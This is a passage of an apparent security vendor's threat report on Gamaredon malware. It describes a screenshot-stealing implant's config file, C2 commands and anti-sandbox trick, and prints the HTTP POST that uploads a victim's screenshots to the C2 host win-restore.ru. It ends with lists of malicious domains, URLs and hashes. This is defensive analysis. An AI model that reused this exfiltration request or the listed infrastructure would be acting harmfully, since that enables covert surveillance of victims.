<p>&#8220;C:\Users\&lt;Username&gt;\AppData\Roaming\Microsoft\desktop.ini&#8221;</p>
<p>Then, it checks if the file already exists and continues execution if so. If not, it runs a routine which checks if there is mouse movement as an anti-sandbox technique. If no mouse movement is detected the malware runs in an infinite loop checking for mouse movement.</p>
<p>If the file &#8220;desktop.ini&#8221; does not exist, the malware creates it and writes the following information into it:</p>
<p>&#8221; interval={60} msfolder={10} status={0}&#8221;</p>
<p>This information is used as configuration data to create the screenshots. There are also other commands possible which can be retrieved from the C2 server. The following commands are available:</p>
<p><strong>exec=</strong>{</p>
<p>This command is used to download and execute a payload from a URL present in the curly brackets. It creates a random file path in temp folder, calls URLDownloadToFile() and CreateProcess() to run the payload. Then, it waits 30s and terminates the payload.</p>
<p><strong>interval={</strong></p>
<p>This command is used to define the interval in seconds between the creation of two or more screenshots.</p>
<p><strong>msfolder={</strong></p>
<p>This command defines the number of screenshots to create.</p>
<p><strong>command={ / command_c={</strong></p>
<p>This command is used to execute a file present as a string between the curly brackets. The variant with the &#8220;c&#8221; uses the Windows tool cmd.exe with help of ShellExecute().</p>
<p><strong>status={</strong></p>
<p>This command contains the flag which defines if screenshots should be made (&#8220;1&#8221;) or not (&#8220;0&#8221;).</p>
<p>Next, it checks for a mutex named &#8220;asassin1dj&#8221; to verify if the system is already infected and creates it if this isn&#8217;t the case:</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_11.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-24705" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_11.png" alt="gamaredon_11" width="552" height="242" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_11.png 552w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_11-300x132.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_11-370x162.png 370w" sizes="(max-width: 552px) 100vw, 552px" /></a></p>
<p><em>Figure 8 Mutex check and creation routine</em></p>
<p>Next, it creates the following folder, if not already present:</p>
<p>&#8220;C:\Users\&lt;Username&gt;\AppData\Roaming\Microsoft\store&#8221;</p>
<p>Next, according to the configuration data in &#8220;desktop.ini&#8221; it constantly creates 24-bit color depth JPEG screenshots without extension in the store folder with help of GDI32 and gdiplus API functions. The following file naming scheme for the screenshots is used:</p>
<p>&lt;year&gt;&lt;month&gt;&lt;day&gt;_&lt;hour&gt;&lt;minute&gt;&lt;seconds&gt;</p>
<p>After the last screenshot was created, it uploads all files from the &#8220;store&#8221; folder to the C2 server &#8220;win-restore[.]ru&#8221;. Then, it deletes all the files present in the folder and starts a new screenshot creation cycle. It should be noted that there is no check of what files are uploaded. The files are uploaded via POST HTTP method to the script &#8220;vvd.php&#8221;. For this, the following HTTP request is used which contains also data from the victim as well the JPEG files:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692876e962d070642253" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /vvd.php HTTP/1.1
Accept: application/x-www-form-urlencoded
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=----------987978B0urd3Gf_$
Accept-Charset: utf-8
User-Agent: asasing
Host: win-restore.ru
Content-Length: &lt;length&gt;
Cache-Control: no-cache

------------987978B0urd3Gf_$
Content-Type: text/html
Content-Disposition: form-data; name="uuid"

WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236
------------987978B0urd3Gf_$
Content-Type: application/octet-stream
Content-Disposition: form-data; name="file0"; filename="&lt;year&gt;&lt;month&gt;&lt;day&gt;_&lt;hour&gt;&lt;minute&gt;&lt;seconds&gt;"
Content-Transfer-Encoding: 8bit
...JPEG file...
------------987978B0urd3Gf_$
Content-Type: application/octet-stream
Content-Disposition: form-data; name="file1"; filename="&lt;year&gt;&lt;month&gt;&lt;day&gt;_&lt;hour&gt;&lt;minute&gt;&lt;seconds&gt;"
Content-Transfer-Encoding: 8bit
...JPEG file...
...
------------987978B0urd3Gf_$</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692876e962d070642253-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-2">2</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-4">4</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-6">6</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-8">8</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-10">10</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-12">12</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-14">14</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-16">16</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-18">18</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-20">20</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-22">22</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-24">24</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692876e962d070642253-26">26</div><div class="crayon-num" data-line="crayon-5f692876e962d070642253-27">27</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692876e962d070642253-1"><span class="crayon-v">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">vvd</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-v">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-2"><span class="crayon-v">Accept</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">application</span><span class="crayon-o">/</span><span class="crayon-v">x</span><span class="crayon-o">-</span><span class="crayon-v">www</span><span class="crayon-o">-</span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-3"><span class="crayon-v">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Keep</span><span class="crayon-o">-</span><span class="crayon-e">Alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-4"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">multipart</span><span class="crayon-o">/</span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">boundary</span><span class="crayon-o">=</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-cn">987978B0urd3Gf_</span><span class="crayon-sy">$</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-5"><span class="crayon-v">Accept</span><span class="crayon-o">-</span><span class="crayon-v">Charset</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">utf</span><span class="crayon-o">-</span><span class="crayon-cn">8</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-6"><span class="crayon-v">User</span><span class="crayon-o">-</span><span class="crayon-v">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">asasing</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-7"><span class="crayon-v">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">win</span><span class="crayon-o">-</span><span class="crayon-v">restore</span><span class="crayon-sy">.</span><span class="crayon-e">ru</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-8"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-v">length</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-9"><span class="crayon-v">Cache</span><span class="crayon-o">-</span><span class="crayon-v">Control</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">no</span><span class="crayon-o">-</span><span class="crayon-v">cache</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-10">&nbsp;</div><div class="crayon-line" id="crayon-5f692876e962d070642253-11"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-cn">987978B0urd3Gf_</span><span class="crayon-sy">$</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-12"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">text</span><span class="crayon-o">/</span><span class="crayon-e">html</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-13"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"uuid"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-14">&nbsp;</div><div class="crayon-line" id="crayon-5f692876e962d070642253-15"><span class="crayon-e">WIN</span><span class="crayon-o">-</span><span class="crayon-e">MLABCSUOVJB_</span><span class="crayon-sy">{</span><span class="crayon-cn">826ee360</span><span class="crayon-o">-</span><span class="crayon-cn">7139</span><span class="crayon-o">-</span><span class="crayon-cn">11de</span><span class="crayon-o">-</span><span class="crayon-cn">8d20</span><span class="crayon-o">-</span><span class="crayon-cn">808e6f6e6263</span><span class="crayon-sy">}</span><span class="crayon-cn">1956047236</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-16"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-cn">987978B0urd3Gf_</span><span class="crayon-sy">$</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-17"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">application</span><span class="crayon-o">/</span><span class="crayon-v">octet</span><span class="crayon-o">-</span><span class="crayon-e">stream</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-18"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"file0"</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">filename</span><span class="crayon-o">=</span><span class="crayon-s">"&lt;year&gt;&lt;month&gt;&lt;day&gt;_&lt;hour&gt;&lt;minute&gt;&lt;seconds&gt;"</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-19"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Transfer</span><span class="crayon-o">-</span><span class="crayon-v">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">8bit</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-20"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-e">JPEG </span><span class="crayon-v">file</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-21"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-cn">987978B0urd3Gf_</span><span class="crayon-sy">$</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-22"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">application</span><span class="crayon-o">/</span><span class="crayon-v">octet</span><span class="crayon-o">-</span><span class="crayon-e">stream</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-23"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"file1"</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">filename</span><span class="crayon-o">=</span><span class="crayon-s">"&lt;year&gt;&lt;month&gt;&lt;day&gt;_&lt;hour&gt;&lt;minute&gt;&lt;seconds&gt;"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-24"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Transfer</span><span class="crayon-o">-</span><span class="crayon-v">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">8bit</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-25"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-e">JPEG </span><span class="crayon-v">file</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692876e962d070642253-26"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-5f692876e962d070642253-27"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-cn">987978B0urd3Gf_</span><span class="crayon-sy">$</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p>Finally, it checks if any new command information is available from the C2 server and updates the &#8220;desktop.ini&#8221; file according to it. Based on functionality, compile timestamps, and binary differencing this malware is likely an updated version of 598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824.</p>
<h4>wmphost.exe</h4>
<p>This file runs an infinite loop until mouse movement gets detected, then it exits. This file can be used to circumvent sandboxes that don&#8217;t simulate mouse movement. To detect if it&#8217;s running inside a sandbox, another file can scan the list of running processes to see if &#8220;wmphost.exe&#8221; is present or not.</p>
<h3>Appendix B: Indicators of Compromise</h3>
<p><strong>Domain Names</strong></p>
<p>admin-ru[.]ru<br />
adobe.update-service[.]net<br />
apploadapp.webhop[.]me<br />
brokbridge[.]com<br />
cat.gotdns[.]ch<br />
check-update[.]ru<br />
childrights.in[.]ua<br />
conhost.myftp[.]org<br />
docdownload.ddns[.]net<br />
downloads.email-attachments[.]ru<br />
downloads.file-attachments[.]ru<br />
dyndownload.serveirc[.]com<br />
e.muravej[.]ua<br />
email-attachments[.]ru<br />
file-attachments[.]ru<br />
freefiles.myftp[.]biz<br />
getmyfile.webhop[.]me<br />
googlefiles.serveftp[.]com<br />
grom56.ddns[.]net<br />
grom90.ddns[.]net<br />
hrome-update[.]ru<br />
hrome-updater[.]ru<br />
loaderskypetm.webhop[.]me<br />
loadsoulip.serveftp[.]com<br />
mail.file-attachments[.]ru<br />
mails.redirectme[.]net<br />
mars-ru[.]ru<br />
msrestore[.]ru<br />
oficialsite.webhop[.]me<br />
parkingdoma.webhop[.]me<br />
poligjong.webhop[.]me<br />
polistar.ddns[.]net<br />
proxy-spread[.]ru<br />
rms.admin-ru[.]ru<br />
samotsvety.com[.]ua<br />
skypeemocache[.]ru<br />
skypeupdate[.]ru<br />
spbpool.ddns[.]net<br />
spread-service[.]ru<br />
spread-ss[.]ru<br />
spread-updates[.]ru<br />
stor.tainfo.com[.]ua<br />
tortilla.sytes[.]net<br />
ukrnet.serveftp[.]com<br />
ukrway.galaktion[.]ru<br />
umachka[.]ua<br />
update-service[.]net<br />
updatesp.ddns[.]net<br />
updateviber.sytes[.]net<br />
webclidie.webhop[.]me<br />
win-restore[.]ru<br />
winloaded.sytes[.]net<br />
winupdateloader[.]ru<br />
www.file-attachments[.]ru<br />
www.win-restore[.]ru<br />
yfperoliz.webhop[.]me</p>
<p><strong>URLs:</strong></p>
<p>http://childrights.in[.]ua/public/manager/img/scrdll.ini<br />
http://prestigeclub.frantov[.]com.ua/press-center/press/chrome-xvnc-v5517.exe<br />
http://umachka[.]ua/screen/dk.tmp<br />
http://umachka[.]ua/screen/screen.tmp<br />
http://viberload.ddns[.]net/viber.nls</p>
<p><strong>Hashes:</strong></p>
<p><strong>Samples using custom developed tools:</strong></p>
<p>002aff376ec452ec35ae2930dfbb51bd40229c258611d19b86863c3b0d156705<br />
08e69f21c3c60a4a9b78f580c3a55d4cfb74729705b5b7d01c1aecfd58fc49e6<br />
0c47cf984afe87a14d0d4c94557864ed19b4cb52783e49ce96ebf9c2f8b52d27<br />
0dc1010c3d3766158e2347d10fc78d9223c6e0e3a44aa8a76622aeff7d429ab9<br />
0f745512940e0efd8f09c6d862571cba2b98fac9a9f7cf30dedcc08ace43a494<br />
145dab86a43835bb37734c16756d6d64d8e5ac6b87c491c57385e27b564136b8<br />
222e85e6d07bdc3a2141cdd582d3f2ed4b1ce5285731cc3f54e6202a13737f8d<br />
2f2b26f2f7d164ea1f529edbc3cb8a1063b39121dad4dd19d8ee4bbbaf25ed37<br />
3242183b1f0176a2e3cfb6bfef96b9d55c5a59ea9614dbde4ef89979336b5a5d<br />
3773ddd462b01f9272656f3150f2c3de19e77199cf5fac1f44287d11593614f9<br />
37c78ee7826d63bb9219de594ed6693f18da5db60e3cbc86795bd10b296f12ac<br />
3e5b1116b2dfd99652a001968a05fc962974931a0596153ab0dea8e4a9982f89<br />
400f53a89d08d47f608e1288d9873bf8d421fc7cd642c5e821674f38e07a1501<br />
598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824<br />
5b22ace98b57ed19d815c49983c96a3c6ff0b2701e8167d4422c6990982abcf9<br />
5ec8b7ca4461720bd69fb49b3f6cae637d8ac3bbd675da938bc5a84e9b73b395<br />
840b3d4cc95dbf311f792a9f50137056deb66bfdbb55eb9f54ff381a0df65656<br />
90ba0f95896736b799f8651ef0600d4fa85c6c3e056e54eab5bb216327912edd<br />
97ebd7bfad63b36b4572132f6ece359ff9991f269048c0b145411699bfe3dc34<br />
9a1fd88970da3809f45cef00360d1e54ea11a70035c277c130404a67371e142d<br />
9cb64d3242d2b591bd2ff13b1aadef2e6b4bf9147f4a0926613b7c9343feb312<br />
a46508ec9e48c256261b2d1914532a36ac7da093253320135d77581051751b75<br />
a7e27ff0695a4bdf58c584f48664acd3a385ccebf3a542fdd6d7383f414aa83a<br />
a804beddd22bb76ea207a9607ed5c888f2f640cbd9ed9a32942fcd0b8a25c4d5<br />
ae5ab2e887a9b46ea7819b7ebbb8163028e66882c97e75b0698dc3a69a69d7da<br />
b2fb7d2977f42698ea92d1576fdd4da7ad7bb34f52a63e4066f158a4b1ffb875<br />
b9434e5a14159c49af2d1a5a11d570f195797d6b17aa560c3dde4a5b3486bf2a<br />
be2be662cc821a924d5641422dd1116e99188c6923da092ca3f0f8f862bd2d2d<br />
d01df47b6187631c9a93bdad1298439ab1a1c5529b3319f3614b6ec2455e5726<br />
d1ba365e93ff0a4f3a2cb1d657568e583e3fbd7dbb1c2c52e28f16480324e3bb<br />
ddfc6bb4819527b2424d6e1a84f04b67adad79401e39efbffba5b7d727e732f0<br />
df434f54802a6814628f30cae335c302bae7085c4e8314d71a41a47d9c410c39<br />
e24715900aa5c9de807b0c8f6ba8015683af26c42c66f94bee38e50a34e034c4<br />
f2296bcb6be68dfb330baec2091fb11a42a51928ba057164213580e6ff0e1126<strong></strong></p>
<p><strong>Samples using bundled commodity tools:</strong></p>
<p>026be8a873560f1496c6961f6e36c312bdda01beacb17c4b744f35ee1923d061<br />
03c943f5cba11b09b9c3afa0705d4a027e5a9d81b299711740cc5aedfe4b4aa1<br />
03e5e99cc8280de4663c4b65bfd26782d4975258808a63a4b20bc068008df7f5<br />
059e40ba91b2b2d827c200476fcbd0fad0d43ab198d0c206c996777d27e6de65<br />
0669e61e51cf43daa431d52b5461c90bdce1b1bee03b087e4406c30264dcb9a4<br />
068b9a9194efacc16cf142814e79b7041b6ab3d671a95bb508dbd30061c324aa<br />
0b4a90b823a581311c4acb59f35e32f81f70ca16a2538f54f4dbe03db93350df<br />
0b5316d723d1ebbec9aba0c9ff6761050305d644c3eeb5291b4e2c4de9e5fa15<br />
0b8d59312699739b6e6cb7aeb0f22a2eaebbb0fd898a97ef9b83e8d8e9ce67a0<br />
0dd13d2d0edbcf9d1825c2bfc165876ada2e4d04e2981a0003cb6503fad2287b<br />
0ddb7867e31f3f30cd1cfe74393f8ac5bbdc61538278de9219a49345f0d3af7f<br />
13fed3accac4f38f28e606b110a3b7924d9c7a1a911f8c0613d0bb791e715267<br />
151cf4c83722ba171ae42640e5e13af67ca06ee0a06a74afa53931acf6ac1506<br />
17006d77cc1459aa3d70e4e9377edb2547a7446647aa9872c9dd9ad860ed7e39<br />
1ec7e595677038145991c6d84dc7808602142f258c1f90e9486cca0fe531d74f<br />
208dc592111a8221a9c633efc120b890585f9a67ed340cbb5ec9db4cd5e164e4<br />
2124adbee89f2c1cb65896bed26e7ffa8bf0fcbdfeb99a9e751fea9cca7a896b<br />
22e97292671ada8deef4329eb115c52f6f1bc598bcf01a3961f1c35a2230a013<br />
259a78122ef51ae503059143bf36941fc6090be83213d196ba3051ba36a0b2a1<br />
26564c23530dd14e0042e074f4178a5b2ad6fc8f51f10138fc39941a6303bff9<br />
29453fa1772b6d7d33842d6abbe0cb55c4a4b66a00f43284c8724d7c16749a7d<br />
2a072d9ce63a94d2530cf9f18a232c6a09f6c7bdff9dbe27faceef53604145ea<br />
2c02d3d3fadd76f9d21f5c093459ddc0045c94f17679269eb7a2990a1a88cb42<br />
2d55000bb5cb9e3e1f137810c2e1eb899f68c40e4a6f6307f226c7b8af208abd<br />
2ded2f3b5b5b6155ce818893c67887cbfa8b539be6c983e314ccf2177552da20<br />
2e89436b355550ceb361fac1b03b78b71eda11d25f26223ac5c8c34ed8972a05<br />
32b0e6394b110860371da5541946a6dcc85358a3951eddc86fdaf5794527c150<br />
33934fcfae5760316b3f40e013cbb03d8086f8c30f9a4ba9bed3f9486a530796<br />
34d86602882e86f8aaaeb7513126c8579a4489f2be31c279188e2f2ca8a0e141<br />
390162dae62a0347e35cf5dad093cfc2f7d4ded62fba9d2df7af6133feb41ee0<br />
3ef8602579c6b145fbaafc8970b4c9a6e7bebd11eb5e37eecaa67b4572c6038b<br />
420acd7e8598fe994b59bf5d30f89e1c11b36cbef464a4786694cf9eada8dd4c<br />
42b4c39179f76ea9eb5835b55a3cf4d8dbb29d42ee0622ad2e89ca48d01e8988<br />
42eed03907c9dfa0e566fbe5968cdb5a1b7b5e18521f7327185ed2208c6c29b4<br />
46a39da996b01e26ddd71d51c9704de2aa641cd3443f6fe0e5c485f1cd9fa65d<br />
47d929c69bfd8d8efb9c280eabec2f73d4bddf1c3c30120c3fb6334623469888<br />
505ef8cbc1271ce32f0c473468d75a1aba5073c37b2e6b49293ddc9efcb4ac96<br />
5230453eeb98c5a183129ed8b918b429e96020887302ba30941c408108a1ab84<br />
5363220b532d7da378b338e839a501ae5c006cc03c8b2d3627c480d64deb1221<br />
558f33d478091993e5b5921604f8c3873efc87f551fddf61612b5c64d5b610f6<br />
55c76f4f93f9e155fbb6a28447f97c1ccda0081061dc3cb9973d42c1686964b7<br />
56c8246819f7de5cba91001793831441d4ce998ccb8237cb96c9f52e88ea384b<br />
59bddb5ccdc1c37c838c8a3d96a865a28c75b5807415fd931eaff0af931d1820<br />
5ac627f8964d3b9cad69f21e3b8f27305f1f68f49e4f4fae2c73949a04b32692<br />
5ccc76ae1cdf668ba7f89c6cbd0bad44f148cbee736320ead237262ba170ffba<br />
5cd4401c1dae9b9ecd75c96ab29dc64ce40bef3acc6faf7c001ff98ebd3b3413<br />
5cd72eaf555813f1ee187def594584f5cfc6a5e83086f35e281327b5210adffb<br />
5f8293eda9fb40684caddf576eba6c81f3a06911ca9e4ecf84ede3b2891cff5e<br />
6c258151c593268c13c252d8f275192a6f7a74d5de5754f2cf20fb94be7ee6ea<br />
0458e168baa4fa5942892065925ac82b12245551b539d54c2884b3a21c2699d8<br />
877f1de209eb9d8b2a20a76f8773d12e5a1fcde4148868c7b73added392f62f6<br />
29c728a169c5d18298e77db161dd5d2f6396ceca9ee7849b63ff8a8bc11f911e<br />
98e092b7bfc3bbdaeb82e05de14ba5835c6ac626c17de9eef2049796a031dd10<br />
27e08fb90ada2fd8ce6b6149786edd3b814dd0324257ebd919ed66ada0334b21<br />
9f651ae6ea538238748614a7f86fe2b0f76e881d6c38da581f284e4b6f79b0ca<br />
f47115ea58615781e56dcac673c19edf7ce00defd7ada709ae97b0708d3eac1e<br />
b80719854f8744ba62e9f0e774c09e2e2ed79dd37f9f94ba3ed05ec8507d55e6<br />
467f04914a1e6093bdaf5c28884bf95ec738234033b3292d289a0799de196d49<br />
5c47d18b3f0e0274c6a66b2eab27d47c73a0105c263d41c6473aba9a28d0a4ba<br />
01c5729ac1ae3928053c085fd616323a3715863ab3d7e9b8106c09e24df34183<br />
5b6a691cf8faf238b27861941a1b667d889889cc9711a3e561403d6a6ed292c9<br />
e2688f72cc7ae836be19e765e39318873554ee194a09945eb3f3805d04f256ca<br />
9f0228e3d1577ffb2533584c2b1d87ebee0c0d490f981e61d18bb27ab02e52cb<br />
2617f9301869304b88d8a3a4f7b2eab6b0edf264cc1a28b99f5685959242ec39<br />
f3107a5a00f36e12be7cc2e37c35903ef855b8043492af374ea918385821443c<br />
63fcfab8e9b97d9aec3d6f243003ea3e2bf955523f08e6f1c0d1e28c839ee3d5<br />
05cbe01b1125897e0e982c587a10a72f4df795b844a4a2c4cec44aee7f30ce94<br />
5a7da102c11960b9651650143a4a08ae4ce97d68dff999961f1ffc792531afeb<br />
df6112e6bad4125b80b8829c13a2ca523bb82cf303cf531389d8795e7512c7e6<br />
cfb8216be1a50aa3d425072942ff70f92102d4f4b155ab2cf1e7059244b99d31<br />
e79dbcc8b60da280e53d9cf818eee1de34251e0551b9947bb2b79a31b131417e<br />
a73eac15797130c381b5b4a65c3fb1cfc723b1586a1882c981211787bba285a6<br />
3ef3a06605b462ea31b821eb76b1ea0fdf664e17d010c1d5e57284632f339d4b<br />
f2355a66af99db5f856ebfcfeb2b9e67e5e83fff9b04cdc09ac0fabb4af556bd<br />
ca87eb1a21c6d4ffd782b225b178ba65463f73de6f4c736eb135be5864f556dc<br />
550ee89d5df17f90ba7689d957cd067dcdbe3d957c5369ea28d925e02ccc8ce6<br />
